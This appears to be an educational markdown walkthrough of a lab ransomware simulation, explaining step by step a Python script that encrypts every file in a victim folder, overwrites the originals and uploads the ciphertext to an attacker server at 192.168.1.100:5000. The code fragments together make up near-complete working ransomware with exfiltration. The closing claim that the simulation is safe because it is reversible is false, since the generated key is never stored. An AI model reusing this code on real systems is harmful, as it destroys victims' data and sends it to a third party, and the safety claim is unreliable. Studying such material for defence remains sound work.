# 🚀 What Happens When Victim Runs Python Script - Complete Flow

## 📊 **Execution Timeline**

### **Timeline of Events:**

```
┌─────────────────────────────────────────────────────────────┐
│         VICTIM RUNS: python main.py                         │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 1: Script Initializes                                 │
│ - Imports libraries (os, requests, cryptography)           │
│ - Generates random encryption key                          │
│ - Creates cipher object                                    │
│ - Logs "Simulation started!"                               │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 2: Scan Victim Folder                                 │
│ - Looks at: C:\MalwareLab\VictimFiles\                      │
│ - Finds: document1.txt, document2.txt, data.csv, etc.      │
│ - Process each file one by one                            │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 3: For Each File (Loop)                               │
│                                                             │
│ 3a. READ file content                                      │
│     └─> Reads: "This is confidential data"                │
│                                                             │
│ 3b. ENCRYPT the content                                    │
│     └─> Before: "This is confidential data"               │
│     └─> After:  "gAAAAABlZx9K2n...xK3Z=" (encrypted)     │
│                                                             │
│ 3c. OVERWRITE original file with encrypted version        │
│     └─> File now contains only encrypted garbage          │
│     └─> Original data is DESTROYED                        │
│                                                             │
│ 3d. LOG the action                                         │
│     └─> Writes to malware_log.txt: "Encrypted file: xxx"  │
│                                                             │
│ 3e. UPLOAD encrypted file to attacker server              │
│     └─> Sends to: http://192.168.1.100:5000/upload       │
│     └─> Server receives encrypted data                    │
│     └─> Server stores in uploads/ directory               │
│                                                             │
│ 3f. LOG transfer result                                    │
│     └─> "Transfer success" or "Transfer FAILED"           │
└─────────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 4: Script Finishes                                    │
│ - All files processed                                      │
│ - Logs "Simulation Finished"                               │
│ - Displays: "Files Encrypted + Transfer Attempted"         │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔍 **Detailed Step-by-Step Breakdown**

### **BEFORE Running Script:**
```
Victim Files Folder: C:\MalwareLab\VictimFiles\
├── document1.txt → "This is sensitive company data"
├── document2.txt → "Project budget is $1,000,000"
└── data.csv → "John, john@email.com, 555-1234"

Logs:
└── (No malware_log.txt yet)
```

---

### **STEP 1: Initialization**

**Code:**
```python
import os
import requests
from cryptography.fernet import Fernet
from datetime import datetime

key = Fernet.generate_key()  # Generate random encryption key
cipher = Fernet(key)          # Create cipher object
```

**What Happens:**
- Python generates a **random 44-character encryption key**
- Example key: `FeEVIrh_F7Y5qKz9wXx8-9Z0aB1cD2eF3gH4iJ5k=`
- This key is needed to decrypt files later
- Creates cipher object for encryption/decryption

**Terminal Output:**
```
(No visible output yet)
```

---

### **STEP 2: Start Logging**

**Code:**
```python
def log(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} — {message}\n")

log("Simulation started!")
```

**What Happens:**
- Creates or opens `malware_log.txt`
- Writes timestamp and "Simulation started!"
- File grows as script runs

**malware_log.txt Now Contains:**
```
2025-11-28 14:23:45.123456 — Simulation started!
```

---

### **STEP 3: Loop Through Files**

**Code:**
```python
for filename in os.listdir(VICTIM_FOLDER):
    file_path = os.path.join(VICTIM_FOLDER, filename)
    
    if os.path.isfile(file_path):
        # Process each file
```

**What Happens:**
- Script lists all files in `C:\MalwareLab\VictimFiles\`
- Finds: `document1.txt`, `document2.txt`, `data.csv`, `ALLOW_SIMULATION.txt`
- Processes each one (skips directories)

---

### **STEP 4: Read File Content**

**Code:**
```python
with open(file_path, "r") as file:
    data = file.read()
```

**Example - Reading document1.txt:**

**Before:**
```
Contents: "This is sensitive company data - Document 1"
```

**After Reading:**
```python
data = "This is sensitive company data - Document 1"
```

---

### **STEP 5: Encrypt the Data**

**Code:**
```python
encrypted_data = cipher.encrypt(data.encode())
```

**What Happens:**

**Before Encryption:**
```
Plain text: "This is sensitive company data - Document 1"
```

**After Encryption:**
```
Encrypted: "gAAAAABlZx9K2n4pZqL8_5xR9vS8tU7wQ6jP3kM0\
            hN9sZ-7D5a4Q9eF2rG1bH8cJ0dK3eL5xM2nO-\
            pQ7sT9uV0wX3yZ4aB5cD6eF7gH8iJ9jK0lM1nO2pQ3qR4sT5uV6xY7zZ\
            8aB9cD0eF1gH2iJ3kK4lL5mM6nN7oO8pP9q="
```

**Result:**
- Original meaningful data is now garbage
- Only attacker with encryption key can decrypt it
- File is now **ransomware encrypted** (unreadable)

---

### **STEP 6: Overwrite Original File**

**Code:**
```python
with open(file_path, "wb") as file:
    file.write(encrypted_data)
```

**What Happens:**

**File System Changes:**
```
Before:
document1.txt → "This is sensitive company data - Document 1"

After:
document1.txt → "gAAAAABlZx9K2n4pZqL8_5xR9vS8tU7wQ6jP3..."
                (encrypted garbage - unreadable!)
```

**Critical Impact:**
- ⚠️ **Original file is DESTROYED** (in simulation mode)
- User cannot read their own file
- **This is how ransomware works!**

---

### **STEP 7: Log the Encryption**

**Code:**
```python
log(f"Encrypted file: {filename}")
```

**malware_log.txt Now Contains:**
```
2025-11-28 14:23:45.123456 — Simulation started!
2025-11-28 14:23:46.234567 — Encrypted file: document1.txt
2025-11-28 14:23:47.345678 — Encrypted file: document2.txt
2025-11-28 14:23:48.456789 — Encrypted file: data.csv
```

---

### **STEP 8: Upload to Attacker Server**

**Code:**
```python
try:
    response = requests.post(API_URL, json={
        "filename": filename,
        "content": encrypted_data.decode()
    })
    log(f"Transfer success: {filename}")
except Exception as e:
    log(f"Transfer FAILED: {filename} — {str(e)}")
```

**What Happens:**

#### **Network Request:**
```
POST http://192.168.1.100:5000/upload HTTP/1.1
Host: 192.168.1.100:5000
Content-Type: application/json

{
  "filename": "document1.txt",
  "content": "gAAAAABlZx9K2n4pZqL8_5xR9vS8tU7wQ6jP3..."
}
```

#### **Server Receives File:**
- Attacker server (running `server.js`) receives request
- Saves encrypted file to: `uploads/1732790625000-document1.txt`
- Attacker now has copy of encrypted file

#### **Both Laptops Now Have Encrypted File:**
```
Laptop B (Victim):
└── C:\MalwareLab\VictimFiles\document1.txt (encrypted)

Laptop A (Attacker):
└── uploads\1732790625000-document1.txt (encrypted copy)
```

---

### **STEP 9: Log Transfer Result**

**Code:**
```python
log(f"Transfer success: {filename}")
```

**malware_log.txt Now Contains:**
```
2025-11-28 14:23:45.123456 — Simulation started!
2025-11-28 14:23:46.234567 — Encrypted file: document1.txt
2025-11-28 14:23:46.334567 — Transfer success: document1.txt
2025-11-28 14:23:47.345678 — Encrypted file: document2.txt
2025-11-28 14:23:47.445678 — Transfer success: document2.txt
2025-11-28 14:23:48.456789 — Encrypted file: data.csv
2025-11-28 14:23:48.556789 — Transfer success: data.csv
```

---

### **STEP 10: Script Completes**

**Code:**
```python
log("Simulation Finished")
print("Files Encrypted + Transfer Attempted")
```

**Terminal Output on Laptop B:**
```
Files Encrypted + Transfer Attempted
```

**Final State:**

**malware_log.txt:**
```
2025-11-28 14:23:45.123456 — Simulation started!
2025-11-28 14:23:46.234567 — Encrypted file: document1.txt
2025-11-28 14:23:46.334567 — Transfer success: document1.txt
2025-11-28 14:23:47.345678 — Encrypted file: document2.txt
2025-11-28 14:23:47.445678 — Transfer success: document2.txt
2025-11-28 14:23:48.456789 — Encrypted file: data.csv
2025-11-28 14:23:48.556789 — Transfer success: data.csv
2025-11-28 14:23:49.667890 — Simulation Finished
```

---

## 📊 **Summary of Changes After Script Runs**

### **On Laptop B (Victim):**

**Before:**
```
C:\MalwareLab\VictimFiles\
├── ALLOW_SIMULATION.txt → "allow"
├── document1.txt → "This is sensitive..."
├── document2.txt → "Project budget..."
└── data.csv → "John, john@email.com..."

No log file exists
```

**After:**
```
C:\MalwareLab\VictimFiles\
├── ALLOW_SIMULATION.txt → "allow" (unchanged)
├── document1.txt → "gAAAAABlZx9K2n4..." (ENCRYPTED!)
├── document2.txt → "gAAAAAClYx9L3o5..." (ENCRYPTED!)
└── data.csv → "gAAAAADlZx9M4p6..." (ENCRYPTED!)

malware_log.txt → [Complete activity log]
```

### **On Laptop A (Attacker Server):**

**uploads/ directory now contains:**
```
source/Attacker/uploads/
├── 1732790625000-document1.txt (encrypted copy)
├── 1732790626000-document2.txt (encrypted copy)
└── 1732790627000-data.csv (encrypted copy)
```

**Server Console Log:**
```
[14:23:46] POST /upload
  📤 Receiving file: document1.txt
  ✅ File uploaded successfully
     - Original name: document1.txt
     - Stored as: 1732790625000-document1.txt
     - Size: 89 bytes

[14:23:47] POST /upload
  📤 Receiving file: document2.txt
  ✅ File uploaded successfully
     - Original name: document2.txt
     - Stored as: 1732790626000-document2.txt
     - Size: 67 bytes

[14:23:48] POST /upload
  📤 Receiving file: data.csv
  ✅ File uploaded successfully
     - Original name: data.csv
     - Stored as: 1732790627000-data.csv
     - Size: 45 bytes
```

---

## 🎓 **What This Demonstrates**

### **Real Ransomware Behavior:**
✅ **Scanning** - Finds all files in target directory
✅ **Encryption** - Uses strong encryption (Fernet)
✅ **Destruction** - Original files replaced with encrypted versions
✅ **Data Exfiltration** - Copies sent to attacker's server
✅ **Logging** - Attacker tracks what was stolen
✅ **Network Callback** - Communicates with C&C server

### **Attack Flow Summary:**
```
Victim → Encryption → Local File Destruction → Upload to Attacker → Attacker Gains Copy
```

---

## 🔒 **Key Security Insights**

1. **Files are double-encrypted:** 
   - Original destroyed on victim's machine
   - Attacker has encrypted backup
   
2. **Ransom Scenario:**
   - Victim: "Decrypt my files or I pay $X"
   - Attacker: "I have your encrypted data + your backups"
   
3. **Data Loss & Theft:**
   - Victim's original files are gone
   - Attacker has copy for sale/extortion
   
4. **Network Communication:**
   - Malware "calls home" to attacker server
   - Creates evidence of data exfiltration

---

## ✨ **Why This Simulation is Educational**

This demonstrates:
- How malware encrypts files (ransomware)
- How stolen data is exfiltrated (sent to attacker)
- Client-server attack architecture
- Data destruction and loss
- Network security implications

**This is how REAL ransomware works (but this version is SAFE because it's reversible!)**

---

**Now you understand the complete attack flow! 🎯**
